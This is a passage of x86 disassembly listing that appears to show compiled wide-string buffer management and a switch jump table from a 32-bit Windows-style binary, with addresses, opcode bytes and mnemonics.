  404ea9:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%eax,%eax,1)
  404eb0:	00 00 00 00 
  404eb4:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404eb7:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404eba:	66 89 14 41          	mov    %dx,(%ecx,%eax,2)
  404ebe:	89 c8                	mov    %ecx,%eax
  404ec0:	8b 55 e0             	mov    -0x20(%ebp),%edx
  404ec3:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  404ec6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ec9:	89 79 14             	mov    %edi,0x14(%ecx)
  404ecc:	66 c7 44 50 02 00 00 	movw   $0x0,0x2(%eax,%edx,2)
  404ed3:	46                   	inc    %esi
  404ed4:	39 75 10             	cmp    %esi,0x10(%ebp)
  404ed7:	0f 85 67 ff ff ff    	jne    0x404e44
  404edd:	8d 45 94             	lea    -0x6c(%ebp),%eax
  404ee0:	89 04 24             	mov    %eax,(%esp)
  404ee3:	e8 3a d1 01 00       	call   0x422022
  404ee8:	83 c4 6c             	add    $0x6c,%esp
  404eeb:	5e                   	pop    %esi
  404eec:	5f                   	pop    %edi
  404eed:	5b                   	pop    %ebx
  404eee:	5d                   	pop    %ebp
  404eef:	c3                   	ret
  404ef0:	c7 45 9c 01 00 00 00 	movl   $0x1,-0x64(%ebp)
  404ef7:	c7 04 24 30 35 42 00 	movl   $0x423530,(%esp)
  404efe:	e8 95 9d 00 00       	call   0x40ec98
  404f03:	83 ec 04             	sub    $0x4,%esp
  404f06:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  404f0d:	1f 84 00 00 00 00 00 
  404f14:	8b 45 98             	mov    -0x68(%ebp),%eax
  404f17:	3d 04 00 00 00       	cmp    $0x4,%eax
  404f1c:	0f 87 b0 00 00 00    	ja     0x404fd2
  404f22:	2d 01 00 00 00       	sub    $0x1,%eax
  404f27:	ff 24 85 e8 4f 40 00 	jmp    *0x404fe8(,%eax,4)
  404f2e:	eb 00                	jmp    0x404f30
  404f30:	8b 45 a0             	mov    -0x60(%ebp),%eax
  404f33:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  404f36:	89 04 24             	mov    %eax,(%esp)
  404f39:	e8 2a b5 01 00       	call   0x420468
  404f3e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404f41:	8b 40 18             	mov    0x18(%eax),%eax
  404f44:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404f47:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404f4a:	83 f8 08             	cmp    $0x8,%eax
  404f4d:	72 28                	jb     0x404f77
  404f4f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404f52:	8b 40 04             	mov    0x4(%eax),%eax
  404f55:	89 45 d8             	mov    %eax,-0x28(%ebp)
  404f58:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404f5b:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  404f5f:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404f64:	8b 45 d8             	mov    -0x28(%ebp),%eax
  404f67:	72 06                	jb     0x404f6f
  404f69:	8b 45 d8             	mov    -0x28(%ebp),%eax
  404f6c:	8b 40 fc             	mov    -0x4(%eax),%eax
  404f6f:	89 04 24             	mov    %eax,(%esp)
  404f72:	e8 b5 14 00 00       	call   0x40642c
  404f77:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404f7a:	c7 40 18 07 00 00 00 	movl   $0x7,0x18(%eax)
  404f81:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404f84:	c7 40 14 00 00 00 00 	movl   $0x0,0x14(%eax)
  404f8b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404f8e:	66 c7 40 04 00 00    	movw   $0x0,0x4(%eax)
  404f94:	c7 45 9c 03 00 00 00 	movl   $0x3,-0x64(%ebp)
  404f9b:	e8 54 b4 01 00       	call   0x4203f4
  404fa0:	eb 32                	jmp    0x404fd4
  404fa2:	8b 45 a0             	mov    -0x60(%ebp),%eax
  404fa5:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  404fa8:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404fab:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  404fae:	c7 45 9c 04 00 00 00 	movl   $0x4,-0x64(%ebp)
  404fb5:	e8 1a b5 01 00       	call   0x4204d4
  404fba:	8b 45 cc             	mov    -0x34(%ebp),%eax
  404fbd:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  404fc0:	c7 45 9c ff ff ff ff 	movl   $0xffffffff,-0x64(%ebp)
  404fc7:	89 04 24             	mov    %eax,(%esp)
  404fca:	e8 d1 cf 01 00       	call   0x421fa0
  404fcf:	83 ec 04             	sub    $0x4,%esp
  404fd2:	0f 0b                	ud2
  404fd4:	8b 45 a0             	mov    -0x60(%ebp),%eax
  404fd7:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  404fda:	89 04 24             	mov    %eax,(%esp)
  404fdd:	e8 a6 f6 ff ff       	call   0x404688
  404fe2:	83 ec 04             	sub    $0x4,%esp
  404fe5:	0f 1f 00             	nopl   (%eax)
  404fe8:	2e 4f                	cs dec %edi
  404fea:	40                   	inc    %eax
  404feb:	00 30                	add    %dh,(%eax)
  404fed:	4f                   	dec    %edi
  404fee:	40                   	inc    %eax
  404fef:	00 a2 4f 40 00 d4    	add    %ah,-0x2bffbfb1(%edx)
  404ff5:	4f                   	dec    %edi
  404ff6:	40                   	inc    %eax
  404ff7:	00 55 53             	add    %dl,0x53(%ebp)
  404ffa:	57                   	push   %edi
  404ffb:	56                   	push   %esi
  404ffc:	83 ec 0c             	sub    $0xc,%esp
  404fff:	8b 74 24 24          	mov    0x24(%esp),%esi
  405003:	81 fe ff ff ff 7f    	cmp    $0x7fffffff,%esi
  405009:	0f 83 a8 00 00 00    	jae    0x4050b7
  40500f:	8b 7c 24 20          	mov    0x20(%esp),%edi
  405013:	8b 47 18             	mov    0x18(%edi),%eax
  405016:	39 f0                	cmp    %esi,%eax
  405018:	73 12                	jae    0x40502c
  40501a:	83 ec 04             	sub    $0x4,%esp
  40501d:	ff 77 14             	push   0x14(%edi)
  405020:	56                   	push   %esi
  405021:	57                   	push   %edi
  405022:	e8 a1 00 00 00       	call   0x4050c8
  405027:	83 c4 10             	add    $0x10,%esp
  40502a:	eb 7e                	jmp    0x4050aa
  40502c:	83 fe 07             	cmp    $0x7,%esi
  40502f:	77 5f                	ja     0x405090
  405031:	8a 4c 24 28          	mov    0x28(%esp),%cl
  405035:	84 c9                	test   %cl,%cl
  405037:	74 57                	je     0x405090
  405039:	8b 4f 14             	mov    0x14(%edi),%ecx
  40503c:	39 f1                	cmp    %esi,%ecx
  40503e:	89 f3                	mov    %esi,%ebx
  405040:	77 02                	ja     0x405044
  405042:	89 cb                	mov    %ecx,%ebx
  405044:	83 f8 08             	cmp    $0x8,%eax
  405047:	72 34                	jb     0x40507d
  405049:	8d 4f 04             	lea    0x4(%edi),%ecx
  40504c:	8b 29                	mov    (%ecx),%ebp
  40504e:	85 db                	test   %ebx,%ebx
  405050:	74 11                	je     0x405063
  405052:	83 ec 04             	sub    $0x4,%esp
  405055:	53                   	push   %ebx
  405056:	55                   	push   %ebp
  405057:	51                   	push   %ecx
  405058:	e8 7f d4 00 00       	call   0x4124dc
  40505d:	83 c4 10             	add    $0x10,%esp
  405060:	8b 47 18             	mov    0x18(%edi),%eax
  405063:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  405067:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40506c:	72 03                	jb     0x405071
  40506e:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  405071:	83 ec 0c             	sub    $0xc,%esp
  405074:	55                   	push   %ebp
  405075:	e8 b2 13 00 00       	call   0x40642c
